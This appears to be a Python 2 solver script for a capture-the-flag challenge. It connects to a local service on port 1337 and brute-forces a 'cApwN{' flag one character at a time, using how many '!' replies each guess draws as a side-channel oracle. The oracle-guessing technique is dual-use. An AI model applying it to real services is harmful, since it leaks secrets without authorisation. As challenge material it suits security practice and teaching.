import sys
import socket

def recvuntil(sock, string):
	tmp = ''
	while string not in tmp:
		try:
			tmp +=sock.recv(1)
		except:
			break
	return tmp

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect(('127.0.0.1',1337))
r.settimeout(0.1)

# <<JOIN, HELLO 10
recvuntil(r, '\r\n')

charset = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!}'

flag = 'cApwN{'
lastNiceCount = len(flag)

def brute():
    global flag, lastNiceCount, charset
    for c in charset:
        payload = '\PRIVATE 1337 gettin it done %s\r\n' % (flag+c)
        r.sendall(payload)
        niceCount = 0
        while True:
            received = recvuntil(r,'!')
            if len(received)==0:
                break
            niceCount +=1

        r.sendall('\r\n')
        if niceCount > lastNiceCount:
            flag = flag+c
            lastNiceCount = niceCount
            print flag
            return

while '}' not in flag:
    brute()

print flag